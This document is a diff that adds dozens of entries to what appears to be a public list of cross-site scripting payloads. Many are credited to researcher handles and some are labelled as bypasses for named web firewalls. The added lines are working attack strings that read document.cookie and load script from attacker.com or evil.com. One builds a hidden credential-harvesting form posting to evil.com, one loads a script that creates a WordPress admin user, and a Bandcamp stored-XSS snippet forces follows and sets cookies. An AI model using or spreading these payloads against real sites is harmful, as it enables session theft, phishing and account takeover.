@@ -106,6 +106,88 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
 "onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
 "><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
 %27%09);%0d%0a%09%09[1].find(alert)//
+"> <img src=x onerror="alert(1)">
+<a href="https://www.evil.com/">Click here </a>
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+v3.0.1%3CsvG%20onLoad=prompt(1)%3E
+"onmouseover="alert(1)
+\"-alert(2)}//
+${alert(3)}
+<img src=1 onerror=alert(document.domain)>
+<><img src=1 onerror=alert(3)>
+{{$on.constructor('alert(4)')()}}
+javascript:alert(document.cookie)
+'>"></title></style></textarea></script><script/src=attacker.com/js></script>
+?msg=<img/src=`%00`%20onerror=this.onerror=confirm(6)
+&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+&toString().constructor.prototype.charAt%3d[].join;[7]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
+http://foo?&apos;-alert(8)-&apos;
+"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+</textarea><ScRiPt>prompt(/hack the planet/)</ScRiPt//
+<iframe src="" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+</textarea><ScRiPt>prompt(/hack the planet/)</ScRiPt//
+ %22%3E%3C/script%3E%3Csvg%20onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)%3E%3C/textarea%3E%3CScRiPt%3Eprompt(document.cookie)%3C/ScRiPt//
+dz7b'-prompt(1)-'nrito
+<object onerror=javascript:javascript:alert(1)>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(2);">]]</C><X></xml>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(document.cookie)&amp;gt;>"> 
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+aE4ZO0UPECswAxliCzE
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[document.domain])</script>
+javascript:alert(document.domain)
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+<script>alert(document.head.innerHTML.substr(77, 97, 120));</script>
+<iframe srcdoc='<body onload=prompt&lpar;51&rpar;>'>
+<script>alert(document.domain)</script>
+<object onerror=javascript:javascript:alert(1)>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(2);">]]</C><X></xml>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(document.cookie)&amp;gt;>">
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+ <img src="https://www.icegif.com/wp-content/uploads/2022/01/icegif-165.gif" width="500" height="600">
+%3CA%20HREF%3d%22http%3a%2f%2fevil.com%22%3EClick%20Here%3C%2fA%3E
+<form action="//evil.com" method="GET"><input type="text" name="u" style='opacity:0;'><input type="password" name="p" style='opacity:0;'><input type="submit" name="s" value="Load more content"> "
+<script>window.location="https://";</script>
+<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+xxxx"/>%3cbutton%20popovertarget=bugvsme%3eCLICK%20HERE%3c/button%3e%3cxxx%20onbeforetoggle=alert``%20popover%20id=bugvsme%3eTEST%3c/xxx%3e
+'"onload="alert('done')'"></script><script>alert('done')</script>
+ test"><img src=x on0x=1 onerror=alert(/POC/)>
+ "><img src=x onerror=alert(1)> 
+%22onpointermove%3Dprompt%281%29+class%3Dss11+
+%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
+alert('Stored XSS on BandCamp')
+alert('Your cookies: ' + document.cookie)
+document.getElementById('follow-unfollow').click()
+alert('Thanks for the follow :^D')
+document.cookie = 'hacker=cdl;path=/;domain=.bandcamp.com'
+in url input 
+put payload with intercept 
+http://example.com"%20test=test
+<a href="http://example.com" test=test"> CLICK ME </a>
+http:falselink.com;"onmouseover%20=%0az=top;z[/al/.source%2b/ert/.source](8);//test.com/
+<a href="http://example.com;" onmouseover="z=top;z[/al/.source%2b/ert/.source](8);//test.com/"
+foo"><svG/onLoAd=confirm(1337)>
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+">]<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(1)>
+"><img src=x on0x=1 onerror=alert(/POC/)>
+[alert][0].call(this,1)
+%26%2302java%26%23115cript:alert(document.domain)
+“>%0D%0A%0D%0A<x ‘=”foo”><x foo=’><img src=x onerror=javascript:alert(cloudfrontbypass)//’>
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+”><sCrIpT>alert(“WHOAMI?”)</ScRiPt>
+<script src="http://evil.com/wordpress_create_admin_user.js"></script>
+<%2FScriPt><sCripT+class%3DDrakenKun>document.write(document.cookie);<%2FsCriPt>
+"><img%20src=x%20onerror="alert(%27POC%20By%20DrakenKun%27)"
 "><img src=1 onmouseleave=print()> - @itsgeekymonk
 <svg on onload=(alert)(document.domain)> -@zapstiko
 <svg/on%20onload=alert(1)> (working) -@aufzayed
